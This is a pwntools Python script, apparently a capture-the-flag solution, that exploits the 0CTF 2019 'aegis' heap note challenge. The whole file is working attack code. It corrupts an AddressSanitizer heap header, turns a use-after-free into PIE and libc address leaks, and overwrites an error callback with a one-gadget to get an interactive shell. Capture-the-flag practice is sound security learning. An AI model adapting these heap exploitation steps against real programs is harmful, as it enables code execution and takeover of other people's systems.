# This exploit is heavily based off of: https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP#aegis

from pwn import *

target = process('./aegis')
elf = ELF('aegis')
libc = ELF('libc-2.27.so')
gdb.attach(target)

def createNote(size, payload, ide):
  print target.recvuntil("Choice: ")
  target.sendline('1')
  print target.recvuntil("Size: ")
  target.sendline(str(size))
  print target.recvuntil("Content: ")
  target.send(payload)
  print target.recvuntil("ID: ")
  target.sendline(str(ide))

def showNote(index):
        print target.recvuntil("Choice: ")
        target.sendline('2')
        print target.recvuntil("Index: ")
        target.sendline(str(index))
        content = target.recvline()
        content = content.replace("Content: ", "")
        content = content.replace("\x0a", "")
        ide = target.recvline()
        ide = ide.replace("Index: ", "")
        ide = ide.replace("\x0a", "")
        return content

def updateNote(index, content, ide):
        print target.recvuntil("Choice: ")
        target.sendline("3")
        print target.recvuntil("Index: ")
        target.sendline(str(index))
        print target.recvuntil("New Content: ")
        target.send(content)
        print target.recvuntil("New ID: ")
        target.sendline(str(ide))

def deleteNote(index):
  print target.recvuntil("Choice: ")
  target.sendline('4')
  print target.recvuntil("Index: ")
  target.sendline(str(index))


def secret(addr):
        print target.recvuntil("Choice: ")
        target.sendline("666")
        print target.recvuntil("Lucky Number: ")
        target.sendline(str(addr))


# Overflow heap header size
createNote(0x10, '0'*0x8, 0xffffffffffffffff)
secret((0x602000000020 >> 3) + 0x7fff8000)
updateNote(0, '\x02'*0x12, 0x1502ffff00020202)
updateNote(0, '\x02'*0x15, 0xffffffff02ffffff)

# Free chunk with overflown size
deleteNote(0)

# Create a new chunk which overlaps with UAF
createNote(0x10, p64(0x602000000018), 0xdeadbeef00)

# Use heap grooming to get PIE infoleak
pieLeak = showNote(0)
pieLeak = u64(pieLeak + "\x00"*(8 - len(pieLeak)))
pieBase = pieLeak - 0x114ab0
log.info("PIE base is: " + hex(pieBase))

# Use PIE infoleak to get libc infoleak via got read
gotPuts = pieBase + elf.got['puts']
log.info(gotPuts)

updateNote(1, "0000", gotPuts >> 8)

putsLeak = showNote(0)
libcBase = u64(putsLeak + "\x00"*(8 - len(putsLeak))) - 0x43120
log.info("libc base is: " + hex(libcBase))

# Calculate needed addresses
errorFunc = pieBase + 0xfb0888
oneShot = libcBase + 0x10a38c

# Do the callback function write using oneshot gadget, and get rce
updateNote(1, p64(errorFunc)[:7], 0x0)
updateNote(0, p8(0), oneShot)


target.interactive()
